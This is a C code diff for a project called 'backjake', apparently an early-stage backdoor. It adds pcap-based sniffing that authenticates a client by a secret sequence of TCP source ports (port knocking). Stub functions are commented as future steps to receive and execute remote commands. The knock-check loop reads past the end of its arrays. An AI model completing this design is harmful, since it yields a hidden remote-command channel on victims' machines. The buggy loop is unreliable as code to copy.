@@ -31,6 +31,12 @@
 
 #include "backjake.h"
 
+static int i = 0;
+int tries[10] = {0};
+int fails = 0;
+
+static void endProgram (int signo);
+
 void* ReceiveDatagram (void *pcap_arg)
 { 
 	printf("Reading!\n");
@@ -44,13 +50,19 @@ void* ReceiveDatagram (void *pcap_arg)
 	return NULL;
 }
 
+void setupSignals()
+{
+    if (signal(SIGINT, endProgram) == SIG_ERR)
+        perror("signal(SIGINT) error");    
+}
+
 void pcapListen(PcapInfo * pcap_ptr)
 {
 	void *status = NULL;
 
 	pcap_loop (pcap_ptr->nic_descr, -1, packetHandler, NULL);
 
-	if (ExitFlag == TRUE || !running)
+	if (ExitFlag == TRUE)
 	{
 		pthread_exit (status);
 	}
@@ -89,6 +101,8 @@ void packetHandler(u_char *ptr_null, const struct pcap_pkthdr* pkthdr, const u_c
 	struct iphdr *ip_header;
 	struct tcphdr *tcp_header;
 	struct udphdr *udp_header;
+	int correct[] = {8080, 9056, 1005, 28}; // change this later
+	size_t j = 0;
 
 	if (checkPacketSize())
 	{
@@ -99,10 +113,43 @@ void packetHandler(u_char *ptr_null, const struct pcap_pkthdr* pkthdr, const u_c
 			if(ip_header->protocol == IPPROTO_TCP)
 			{
 				tcp_header = (struct tcphdr*)(packet + sizeof(struct ethhdr) + ip_header->ihl*4);
-				printf("Source Port: %d\n", ntohs(tcp_header->source));
-				printf("Dest Port: %d\n", ntohs(tcp_header->dest));
-				printf("Payload: %d\n", ntohs(tcp_header));
-				printf("\n");
+				// printf("Source Port: %d\n", ntohs(tcp_header->source));
+				// printf("Dest Port: %d\n", ntohs(tcp_header->dest));
+				// printf("\n");
+				int temp = sizeof(correct)/sizeof(int);
+				if (i == temp)
+					i = 0;
+
+				tries[i++] = (int) ntohs(tcp_header->source);
+
+				//("%d\n", temp);
+
+				for (j=0; j<=temp; j++)
+				{
+					printf("i:%d j:%d try:%d cor:%d\n", i, j, tries[j], correct[j]);
+					if( tries[j] != correct[j])
+					{
+						fails++;
+						break;
+					}
+
+					if (j == temp)
+					{
+						printf("============ AUTH ============\n"); // change this later
+						for (j=0; j<=temp; j++)
+							tries[j]=0;
+						i = 0;
+						fails = 0;
+					}
+				}
+
+				if (fails == temp+1)
+				{
+					for (j=0; j<=temp; j++)
+						tries[j]=0;
+					i = 0;
+					fails=0;
+				}
 			}
 		}
 	}
@@ -120,4 +167,33 @@ int PrintInHex(char *mesg, unsigned char *p, int len)
 	}
 	printf("\n");
 	return 0;
+}
+
+int authenticatedClient()
+{
+    // NOT YET IMPLEMENTED
+    
+    // spawn knock code listener
+    // while getting commands
+    //          execute command
+    //          spawn result thread, pipe in results
+}
+
+void* knockListener(void* pcap_arg)
+{
+    // NOT YET IMPLEMENTED
+    //
+    return NULL;
+}
+
+void executeCommand()
+{
+    //spawnThread();
+}
+
+
+static void endProgram (int signo)
+{
+    // stop the program
+    exit(1);
 }
